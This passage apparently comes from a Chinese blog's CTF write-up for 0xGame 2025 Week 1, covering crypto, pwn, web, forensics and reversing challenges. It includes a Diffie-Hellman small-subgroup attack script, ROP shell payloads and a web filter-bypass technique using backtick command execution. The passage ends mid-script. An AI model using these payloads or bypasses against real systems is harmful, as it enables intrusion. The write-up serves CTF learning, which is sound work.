# 完全分解\n        factors = data['factors']\n        if len(factors) == 2:\n            p = int(factors[0][0])\n            q = int(factors[1][0])\n            print(f\"成功分解n:\")\n            print(f\"p = {p}\")\n            print(f\"q = {q}\")\nexcept Exception as ex:\n    print(f\"在线分解失败: {ex}\")\n    print(\"尝试本地分解...\")\n    \n    # 方法2: 使用gmpy2进行小因子试除和Pollard's rho\n    # 对于512位的n，可能需要更强大的工具如yafu\n    \n    # 先尝试小素数试除\n    def trial_division(n, limit=10000000):\n        i = 2\n        while i * i <= n and i < limit:\n            if n % i == 0:\n                return i\n            i += 1\n        return None\n    \n    factor = trial_division(n)\n    if factor:\n        p = factor\n        q = n // p\n        print(f\"找到因子: p = {p}, q = {q}\")\n    else:\n        # 使用Fermat分解法（当p和q接近时效果好）\n        def fermat_factor(n):\n            a = gmpy2.isqrt(n)\n            b2 = gmpy2.square(a) - n\n            while not gmpy2.is_square(b2):\n                a += 1\n                b2 = gmpy2.square(a) - n\n            p = a + gmpy2.isqrt(b2)\n            q = a - gmpy2.isqrt(b2)\n            return int(p), int(q)\n        \n        try:\n            p, q = fermat_factor(n)\n            print(f\"Fermat分解成功: p = {p}, q = {q}\")\n        except:\n            print(\"分解失败，需要使用更强大的分解工具（如yafu, msieve等）\")\n            print(\"或者在 factordb.com 网站上查询\")\n            exit()\n\n# 验证分解是否正确\nif p * q == n:\n    print(f\"\\n验证成功: p * q = n\")\n    \n    # 计算欧拉函数\n    phi = (p - 1) * (q - 1)\n    \n    # 计算私钥d\n    d = inverse(e, phi)\n    \n    # 解密\n    m = pow(c, d, n)\n    \n    # 转换为字节\n    flag = long_to_bytes(m)\n    \n    print(f\"\\n解密结果:\")\n    print(f\"Flag: {flag.decode()}\")\nelse:\n    print(\"分解错误: p * q != n\")\n```\n\n## Diffie-Hellman\n\n小子群攻击脚本\n\n```python\nimport socket\nfrom hashlib import sha256\n\n# 尝试导入 pwntools (可选)\ntry:\n    from pwn import remote\n    PWNTOOLS_AVAILABLE = True\nexcept ImportError:\n    PWNTOOLS_AVAILABLE = False\n\n# 尝试导入 Crypto 模块（支持多种安装方式）\ntry:\n    from Crypto.Util.number import long_to_bytes\n    from Crypto.Cipher import AES\n    from Crypto.Util.Padding import unpad\n    print(\"[+] 使用 pycryptodome\")\nexcept ImportError:\n    try:\n        from Cryptodome.Util.number import long_to_bytes\n        from Cryptodome.Cipher import AES\n        from Cryptodome.Util.Padding import unpad\n        print(\"[+] 使用 pycryptodomex\")\n    except ImportError:\n        print(\"[-] 错误：未找到加密库\")\n        print(\"请运行: pip uninstall crypto pycrypto pycryptodome -y\")\n        print(\"然后运行: pip install pycryptodome\")\n        exit(1)\n\ndef recv_until(sock, marker):\n    \"\"\"接收数据直到遇到特定标记\"\"\"\n    data = b\"\"\n    sock.settimeout(10)  # 设置超时\n    try:\n        while marker not in data:\n            chunk = sock.recv(1)\n            if not chunk:\n                break\n            data += chunk\n    except socket.timeout:\n        pass\n    return data\n\ndef recv_line(sock):\n    \"\"\"接收一行数据\"\"\"\n    data = b\"\"\n    sock.settimeout(10)\n    try:\n        while b\"\\n\" not in data:\n            chunk = sock.recv(1)\n            if not chunk:\n                break\n            data += chunk\n    except socket.timeout:\n        pass\n    return data.strip()\n\ndef exploit_manual():\n    \"\"\"\n    手动版本 - 只需要 socket 和 pycryptodome\n    \"\"\"\n    host = \"nc1.ctfplus.cn\"\n    port = 34869\n    \n    print(\"[*] 连接到服务器: {}:{}\".format(host, port))\n    \n    # 创建 socket 连接\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(15)  # 设置总超时\n    sock.connect((host, port))\n    \n    try:\n        # 接收并解析 Prime\n        print(\"[*] 接收 Prime...\")\n        recv_until(sock, b\"The Prime is \")\n        p_line = recv_line(sock)\n        p = int(p_line)\n        print(f\"[+] Prime (p): {p}\")\n        \n        # 接收并解析 Generator\n        print(\"[*] 接收 Generator...\")\n        recv_until(sock, b\"The Generator is \")\n        g_line = recv_line(sock)\n        g = int(g_line)\n        print(f\"[+] Generator (g): {g}\")\n        \n        # 接收并解析 Alice's Public Key\n        print(\"[*] 接收 Alice's Public Key...\")\n        recv_until(sock, b\"Alice's Public Key is \")\n        a_line = recv_line(sock)\n        A = int(a_line)\n        print(f\"[+] Alice's Public Key (A): {A}\")\n        \n        # 发送恶意的 Bob's Public Key = 1\n        print(\"[*] 等待输入提示...\")\n        recv_until(sock, b\"Bob's Public Key:\")\n        print(\"[*] 发送恶意 Bob's Public Key: 1\")\n        sock.send(b\"1\\n\")\n        \n        # 接收加密的 Flag\n        print(\"[*] 接收加密的 Flag...\")\n        recv_until(sock, b\"Encrypted Flag:\")\n        enc_line = recv_line(sock)\n        enc_hex = enc_line.decode().strip()\n        print(f\"[+] 加密的 Flag: {enc_hex}\")\n        \n        # 使用已知的共享密钥 s = 1 解密\n        print(\"[*] 正在解密...\")\n        s = 1\n        key = sha256(long_to_bytes(s)).digest()\n        cipher = AES.new(key, AES.MODE_ECB)\n        enc = bytes.fromhex(enc_hex)\n        flag = unpad(cipher.decrypt(enc), 16)\n        \n        flag_str = flag.decode()\n        print(\"\\n\" + \"=\" * 60)\n        print(f\"[+] 成功获取 Flag: {flag_str}\")\n        print(\"=\" * 60)\n        \n        return flag_str\n        \n    except Exception as e:\n        print(f\"[-] 错误: {e}\")\n        import traceback\n        traceback.print_exc()\n        return None\n    finally:\n        sock.close()\n\n\ndef exploit_with_pwntools():\n    \"\"\"\n    pwntools 版本 - 需要安装 pwntools\n    \"\"\"\n    if not PWNTOOLS_AVAILABLE:\n        return None\n    \n    host = \"nc1.ctfplus.cn\"\n    port = 34869\n    \n    print(\"[*] 连接到服务器: {}:{}\".format(host, port))\n    conn = remote(host, port)\n    \n    try:\n        # 接收并解析 Prime\n        conn.recvuntil(b\"The Prime is \")\n        p = int(conn.recvline().strip())\n        print(f\"[+] Prime (p): {p}\")\n        \n        # 接收并解析 Generator\n        conn.recvuntil(b\"The Generator is \")\n        g = int(conn.recvline().strip())\n        print(f\"[+] Generator (g): {g}\")\n        \n        # 接收并解析 Alice's Public Key\n        conn.recvuntil(b\"Alice's Public Key is \")\n        A = int(conn.recvline().strip())\n        print(f\"[+] Alice's Public Key (A): {A}\")\n        \n        # 发送恶意的 Bob's Public Key = 1\n        conn.recvuntil(b\"Bob's Public Key: \")\n        print(\"[*] 发送恶意 Bob's Public Key: 1\")\n        conn.sendline(b\"1\")\n        \n        # 接收加密的 Flag\n        conn.recvuntil(b\"Encrypted Flag: \")\n        enc_hex = conn.recvline().strip().decode()\n        print(f\"[+] 加密的 Flag: {enc_hex}\")\n        \n        # 使用已知的共享密钥 s = 1 解密\n        print(\"[*] 正在解密...\")\n        s = 1\n        key = sha256(long_to_bytes(s)).digest()\n        cipher = AES.new(key, AES.MODE_ECB)\n        enc = bytes.fromhex(enc_hex)\n        flag = unpad(cipher.decrypt(enc), 16)\n        \n        flag_str = flag.decode()\n        print(\"\\n\" + \"=\" * 60)\n        print(f\"[+] 成功获取 Flag: {flag_str}\")\n        print(\"=\" * 60)\n        \n        return flag_str\n        \n    except Exception as e:\n        print(f\"[-] 错误: {e}\")\n        import traceback\n        traceback.print_exc()\n        return None\n    finally:\n        conn.close()\n\n\nif __name__ == \"__main__\":\n    print(\"=\" * 60)\n    print(\"Diffie-Hellman 小子群攻击\")\n    print(\"Target: nc1.ctfplus.cn:34869\")\n    print(\"=\" * 60)\n    print()\n    \n    # 先尝试 pwntools 版本，如果失败则用手动版本\n    if PWNTOOLS_AVAILABLE:\n        print(\"[*] 尝试使用 pwntools...\")\n        flag = exploit_with_pwntools()\n    else:\n        print(\"[*] pwntools 未安装，使用手动版本...\")\n        flag = None\n    \n    if flag is None:\n        print(\"\\n[*] 使用手动版本（只需要 socket + pycryptodome）...\")\n        flag = exploit_manual()\n    \n    if flag:\n        print(\"\\n[*] 攻击原理:\")\n        print(\"    1. 服务器计算共享密钥: s = B^a mod p\")\n        print(\"    2. 我们发送 B = 1\")\n        print(\"    3. 则 s = 1^a mod p = 1 (已知值)\")\n        print(\"    4. 使用 s = 1 作为密钥解密 flag\")\n    else:\n        print(\"\\n[-] 攻击失败，请检查网络连接或服务器状态\")\n```\n\nflag :`0xgame{ECC_1s_4w3s0m3_but_n0t_perf3ct}`\n\n","slug":"0xGame2025Week1WP","published":1,"updated":"2025-10-19T03:21:24.132Z","_id":"cmgkxc3li0000ggt84z7wbir0","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><h2 id=\"数学题😭\"><a href=\"#数学题😭\" class=\"headerlink\" title=\"数学题😭\"></a>数学题😭</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io=remote(<span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span>,<span class=\"number\">23143</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Kore wa shiren da!(n&quot;</span>)</span><br><span class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1000</span>):</span><br><span class=\"line\">\t t=io.recvuntil(<span class=\"string\">b&quot;?&quot;</span>)[:-<span class=\"number\">3</span>]</span><br><span class=\"line\">\t <span class=\"keyword\">if</span> <span class=\"string\">b&quot;x&quot;</span> <span class=\"keyword\">in</span> t:</span><br><span class=\"line\">\t\tt=t.decode()</span><br><span class=\"line\">\t\tt =t.replace(<span class=\"string\">&quot;x&quot;</span>,<span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">\t\tt=t.encode()</span><br><span class=\"line\">\t num=<span class=\"built_in\">eval</span>(t)</span><br><span class=\"line\">\t io.sendline(<span class=\"built_in\">str</span>(num).encode())</span><br><span class=\"line\">\t io.recvline()</span><br><span class=\"line\">\t io.recvline()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"nc\"><a href=\"#nc\" class=\"headerlink\" title=\"nc\"></a>nc</h2><p><code>nc 域名/IP 端口号</code></p>\n<h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><p><code>ca\\t flag </code>这样就可以啦。</p>\n<h2 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h2><p><code>buf</code>到<code>rbp</code>的偏移+8就是填充的垃圾数据的长度，后面再加上目标函数的返回地址就行了。</p>\n<h2 id=\"ROP1\"><a href=\"#ROP1\" class=\"headerlink\" title=\"ROP1\"></a>ROP1</h2><p>找到<code>rdi</code>，一参寄存器的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary pwn --only <span class=\"string\">&quot;pop|ret&quot;</span> | grep <span class=\"string\">&quot;rdi&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>找到想要rdi存放的参数<code>sh</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary pwn --string <span class=\"string\">&quot;sh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后就同上一题栈溢出，构造ROP链。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload=<span class=\"number\">0x28</span>*<span class=\"string\">b&#x27;a&#x27;</span>+p64(<span class=\"number\">0x000000000040117e</span>)+p64(<span class=\"number\">0x000000000040201e</span>)+p64(<span class=\"number\">0x401195</span>)</span><br></pre></td></tr></table></figure>\n\n<p>就能得到flag了。</p>\n<p>完整代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io=process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">gdb.attach(io)      // gdb调试</span><br><span class=\"line\">payload=<span class=\"number\">0x28</span>*<span class=\"string\">b&#x27;a&#x27;</span>+p64(<span class=\"number\">0x000000000040117e</span>)+p64(<span class=\"number\">0x000000000040201e</span>)+p64(<span class=\"number\">0x401195</span>)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ROP2\"><a href=\"#ROP2\" class=\"headerlink\" title=\"ROP2\"></a>ROP2</h2><p>除了<code>sh</code>,<code>cat</code>,还有<code>$0</code>也可以获得shell，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb ./pwn</span><br></pre></td></tr></table></figure>\n\n<p>可以在gdb中找到<code>$0</code>字符串</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search <span class=\"string\">&quot;$0&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>找到<code>$0</code>的地址后就对应替换<code>rdi</code>参数的地址。ROP链同上题。</p>\n<h1 id=\"Osint\"><a href=\"#Osint\" class=\"headerlink\" title=\"Osint\"></a>Osint</h1><p>图一谷歌识图，注意山名是中文，大室山</p>\n<p>图二拍摄时的经纬度其实在照片的详细信息里已经记录了，右键属性详细信息，往下滑就能找到GPS，里面就记录了经纬度，然后进行换算，不进位，就得到了<code>32.1191</code>经度和<code>118.9265</code> 纬度。</p>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"Lemon\"><a href=\"#Lemon\" class=\"headerlink\" title=\"Lemon\"></a>Lemon</h2><p><code>web</code>是真不会，我只会开发者工具查看源码,然后就只会解签到。真的看不懂<code>php</code>😭。（骗你的，就算懂了也不会改写<code>http</code>请求。）</p>\n<h2 id=\"Http请求\"><a href=\"#Http请求\" class=\"headerlink\" title=\"Http请求\"></a>Http请求</h2><p>url后面加<code>/?hello=web</code>这就是get传递。</p>\n<p>然后用burp抓包，对应修改请求参数，就能得到flag了。</p>\n<p><code>0XGame&#123;Congratuation_You_Are_Http_God!!!&#125;</code></p>\n<h2 id=\"rce1\"><a href=\"#rce1\" class=\"headerlink\" title=\"rce1\"></a>rce1</h2><p><img src=\"/images/wp/hackbar.png\" alt=\"hackbar\"></p>\n<p>右键检查&gt;&gt;找到hackbar，按上面的设置参数，注意<code>rce1[]=1</code>这样才表示rce1是数组.数组的md5相等。一些指令参数被过滤的话可以试试其他的，如<code>readfile</code>,<code>print</code>等，然后可以用引号把一些指令隔开，分开来写就不会被过滤了。如<code>&#39;fl&#39;.&#39;a&#39;&#39;g&#39;</code>,引号之间用.拼接。对于要执行的命令需要用反引号，如<code>print(`tac f???`)</code>,反引号表示运行里面的命令。</p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>扫码关注喵~</p>\n<h2 id=\"Sign-In\"><a href=\"#Sign-In\" class=\"headerlink\" title=\"Sign-In\"></a>Sign-In</h2><p><code>==</code>结尾判断是base64加密，通过在线工具解密之后发现并不是<code>0xGame&#123;&#125;</code>,原来是还经过了字符移位，通过已知flag格式计算出偏移量，得到flag。</p>\n<h2 id=\"公众号\"><a href=\"#公众号\" class=\"headerlink\" title=\"公众号\"></a>公众号</h2><p><code>.docx</code>文件其实就是一个<code>.zip</code>压缩包，所以更改一下后缀名，然后将<code>.zip</code>文件解压，接下来就可以去一个个文件(如<code>.xml</code>文件)里找<code>flag</code>了。</p>\n<h2 id=\"shell\"><a href=\"#shell\" class=\"headerlink\" title=\"shell\"></a>shell</h2><p>按照yolo师傅给的提示操作就行</p>\n<h2 id=\"shell-plus\"><a href=\"#shell-plus\" class=\"headerlink\" title=\"shell_plus\"></a>shell_plus</h2><p>进入<code>welcome</code>用户后先<code>cat hash_value</code>找到哈希值，然后在<code>fikes</code>文件夹里用<code>find . -maxdepth 1 -type f -exec sha256sum &#123;&#125; \\; | grep &quot;c59aec252d136cd2da2c5af7b17aed68f661a0114e8fc38b6e2a3d4e993e38fa&quot;</code>这一行命令就可以找到那个加密的flag文件，最后用揭秘脚本解密。</p>\n<h2 id=\"LSB隐写\"><a href=\"#LSB隐写\" class=\"headerlink\" title=\"LSB隐写\"></a>LSB隐写</h2><p>StegSolve工具打开图片，R,G,B通道设为最低位0，就能看到flag了<code>0xGame&#123;W1_Need_t0_t@k3_a_break&#125;</code>。</p>\n<h2 id=\"磁盘镜像\"><a href=\"#磁盘镜像\" class=\"headerlink\" title=\"磁盘镜像\"></a>磁盘镜像</h2><p>在<code>bash</code>里用<code>TestDisk</code>分析磁盘</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">testdisk do_not_enter.dd</span><br></pre></td></tr></table></figure>\n\n<p>在分区表中发现了一个名为 <strong><code>[Do_not_enter]</code></strong> 的分区.</p>\n<p>挂载分区,</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> mount -o loop,offset=44040192 do_not_enter.dd /mnt/secret</span><br></pre></td></tr></table></figure>\n\n<p>查看分区内容,</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> -la /mnt/secret</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果有文件夹，深入查看</span></span><br><span class=\"line\">find /mnt/secret -<span class=\"built_in\">type</span> f -name <span class=\"string\">&quot;*flag*&quot;</span> 2&gt;/dev/null</span><br><span class=\"line\">find /mnt/secret -<span class=\"built_in\">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n\n<p>但不幸的是分区之中没有,不如直接用<code>strings</code>把全部字符串找出来吧，<code>strings</code>命令好用！</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> strings /mnt/secret/syslog</span><br><span class=\"line\"><span class=\"built_in\">sudo</span> strings /mnt/secret/auth.log</span><br></pre></td></tr></table></figure>\n\n<p>然后就找到了flag:<code>0xGame&#123;WoW_y0u_fouNd_1t?_114514&#125;</code></p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h2 id=\"SignIn\"><a href=\"#SignIn\" class=\"headerlink\" title=\"SignIn\"></a>SignIn</h2><p><code>shift</code>+F12  就可以看到所有字符串啦，包括flag🥰。</p>\n<h2 id=\"SignIn2\"><a href=\"#SignIn2\" class=\"headerlink\" title=\"SignIn2\"></a>SignIn2</h2><p>ROT加密：凯撒密码，移位操作进行字符加密。  0移位16得到@。从而得到<code>0xGame&#123;&#125;</code>形式的flag。</p>\n<h2 id=\"ZZZ\"><a href=\"#ZZZ\" class=\"headerlink\" title=\"ZZZ\"></a>ZZZ</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入z3库</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">x1 = BitVec(<span class=\"string\">&#x27;x1&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">x2 = BitVec(<span class=\"string\">&#x27;x2&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">x3 = BitVec(<span class=\"string\">&#x27;x3&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">x4 = BitVec(<span class=\"string\">&#x27;x4&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">solver = Solver()</span><br><span class=\"line\">solver.add(<span class=\"number\">3</span> * x2 + <span class=\"number\">5</span> * x1 + <span class=\"number\">7</span> * x4 + <span class=\"number\">2</span> * x3 == -<span class=\"number\">1445932505</span>)</span><br><span class=\"line\">solver.add(<span class=\"number\">8</span> * x2 + <span class=\"number\">4</span> * x3 + <span class=\"number\">2</span> * x1 + x4 == -<span class=\"number\">672666814</span>)</span><br><span class=\"line\">solver.add(<span class=\"number\">7</span> * x2 + <span class=\"number\">3</span> * x1 + <span class=\"number\">5</span> * x4 + <span class=\"number\">4</span> * x3 == <span class=\"number\">958464147</span>)</span><br><span class=\"line\">solver.add(((x1 ^ x2) &lt;&lt; <span class=\"number\">6</span>) + (LShR(x3, <span class=\"number\">6</span>) ^ <span class=\"number\">0x4514</span>) == <span class=\"number\">123074281</span>)</span><br><span class=\"line\"><span class=\"comment\"># 循环寻找所有可能的</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> solver.check() == sat:</span><br><span class=\"line\">    model = solver.model()</span><br><span class=\"line\">    v1 = model[x1].as_long()</span><br><span class=\"line\">    v2 = model[x2].as_long()</span><br><span class=\"line\">    v3 = model[x3].as_long()</span><br><span class=\"line\">    v4 = model[x4].as_long()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x1 = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(v1)&#125;</span> (<span class=\"subst\">&#123;v1&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x2 = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(v2)&#125;</span> (<span class=\"subst\">&#123;v2&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x3 = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(v3)&#125;</span> (<span class=\"subst\">&#123;v3&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x4 = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(v4)&#125;</span> (<span class=\"subst\">&#123;v4&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    final_flag = <span class=\"string\">f&quot;0xGame&#123;&#123;<span class=\"subst\">&#123;v1:08x&#125;</span><span class=\"subst\">&#123;v2:08x&#125;</span><span class=\"subst\">&#123;v3:08x&#125;</span><span class=\"subst\">&#123;v4:08x&#125;</span>&#125;&#125;&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">    solver.add(Or(x1 != v1, x2 != v2, x3 != v3, x4 != v4))</span><br></pre></td></tr></table></figure>\n\n<p>此题有多解，注意正确flag的哈希值。</p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"维吉尼亚加密\"><a href=\"#维吉尼亚加密\" class=\"headerlink\" title=\"维吉尼亚加密\"></a>维吉尼亚加密</h2><p>全AI,维吉尼亚加密advanced我解出了多种可能，试了一下<code>0xGame&#123;excellent&#125;</code>这个是对的，就解出来了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> digits, ascii_letters, punctuation, ascii_lowercase</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> product</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&quot;QAQ(@.@)&quot;</span></span><br><span class=\"line\">alphabet = digits + ascii_letters + punctuation</span><br><span class=\"line\">ciphertext = <span class=\"string\">&quot;0l0CSoYM&lt;c;amo_P_&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;密文: <span class=\"subst\">&#123;ciphertext&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Key: <span class=\"subst\">&#123;key&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span 